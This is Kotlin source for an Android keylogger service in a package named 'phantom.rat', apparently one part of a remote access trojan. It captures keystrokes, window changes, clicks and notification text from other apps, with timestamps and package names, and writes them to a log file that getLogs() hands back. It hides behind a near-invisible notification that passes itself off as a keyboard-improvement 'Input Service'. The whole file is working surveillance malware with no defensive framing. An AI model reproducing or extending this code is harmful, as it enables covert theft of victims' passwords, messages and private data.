package com.phantom.rat.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.phantom.rat.R
import java.io.File
import java.io.FileWriter

class KeyloggerService : Service() {

    private val keylogs = mutableListOf<String>()
    private var isLogging = false
    private var logFile: File? = null

    companion object {
        private const val CHANNEL_ID = "keylogger_channel"
        private const val NOTIFICATION_ID = 8888
        var isRunning = false
            private set
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        
        // Create log file
        val logDir = File(filesDir, "logs")
        logDir.mkdirs()
        logFile = File(logDir, "keystrokes_${System.currentTimeMillis()}.txt")
        
        // Register receiver for accessibility service data
        val filter = IntentFilter().apply {
            addAction("com.phantom.rat.KEYLOG")
            addAction("com.phantom.rat.WINDOW_CHANGE")
            addAction("com.phantom.rat.CLICK")
            addAction("com.phantom.rat.NOTIFICATION")
        }
        registerReceiver(keylogReceiver, filter, RECEIVER_EXPORTED)
        
        setupNotification()
        isLogging = true
        
        // Periodic flush to disk
        Thread {
            while (isLogging) {
                try {
                    Thread.sleep(5000)
                    flushToDisk()
                } catch (_: Exception) {}
            }
        }.start()
    }

    private val keylogReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                "com.phantom.rat.KEYLOG" -> {
                    val text = intent.getStringExtra("text") ?: return
                    val pkg = intent.getStringExtra("package") ?: ""
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    keylogs.add("[$time][$pkg] KEY: $text")
                }
                "com.phantom.rat.WINDOW_CHANGE" -> {
                    val pkg = intent.getStringExtra("package") ?: ""
                    val cls = intent.getStringExtra("class") ?: ""
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    keylogs.add("[$time] WINDOW: $pkg / $cls")
                }
                "com.phantom.rat.CLICK" -> {
                    val text = intent.getStringExtra("text") ?: ""
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    keylogs.add("[$time] CLICK: $text")
                }
                "com.phantom.rat.NOTIFICATION" -> {
                    val text = intent.getStringExtra("text") ?: ""
                    val pkg = intent.getStringExtra("package") ?: ""
                    val time = intent.getLongExtra("time", System.currentTimeMillis())
                    keylogs.add("[$time][$pkg] NOTIFICATION: $text")
                }
            }
        }
    }

    private fun setupNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Input Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Input Service")
            .setContentText("Improving keyboard experience...")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun flushToDisk() {
        try {
            if (keylogs.isEmpty()) return
            val file = logFile ?: return
            val writer = FileWriter(file, true)
            keylogs.forEach { writer.write("$it\n") }
            writer.flush()
            writer.close()
            keylogs.clear()
        } catch (_: Exception) {}
    }

    fun getLogs(): String {
        flushToDisk()
        val file = logFile ?: return ""
        return if (file.exists()) file.readText() else ""
    }

    fun clearLogs() {
        keylogs.clear()
        logFile?.delete()
        logFile = File(filesDir, "logs/keystrokes_${System.currentTimeMillis()}.txt")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isLogging = false
        isRunning = false
        flushToDisk()
        try { unregisterReceiver(keylogReceiver) } catch (_: Exception) {}
        super.onDestroy()
    }
}
